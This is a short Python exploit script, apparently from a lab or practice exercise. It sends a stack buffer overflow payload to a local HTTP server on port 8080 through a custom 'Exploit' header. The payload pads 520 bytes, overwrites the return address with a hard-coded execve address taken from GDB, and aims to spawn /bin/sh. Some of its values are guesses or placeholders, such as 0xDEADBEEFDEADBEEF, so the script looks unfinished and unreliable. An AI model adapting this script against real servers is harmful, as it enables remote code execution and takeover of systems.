#!/usr/bin/env python3
import socket
import struct

host = "localhost"
port = 8080

# Real address of execve from GDB
execve_addr = struct.pack("<Q", 0x7ffff7e7f310)

# Stack address estimate where we will place "/bin/sh"
binsh_ptr = struct.pack("<Q", 0x7fffffffe510)  # adjust if needed

null = struct.pack("<Q", 0x0)

# Build overflow buffer
payload = b"/bin/sh\x00"      # place the string first
payload += b"A" * (520 - len(payload))  # pad to reach return address
payload += execve_addr        # overwrite RIP
payload += null
payload += struct.pack("<Q", 0xDEADBEEFDEADBEEF)  # placeholder for now
payload += null
payload += null

# Build full HTTP request with payload inside a header
request = b"GET / HTTP/1.0\r\n"
request += b"Exploit: " + payload + b"\r\n"
request += b"\r\n"

# Send request
s = socket.create_connection((host, port))
s.send(request)
s.close()
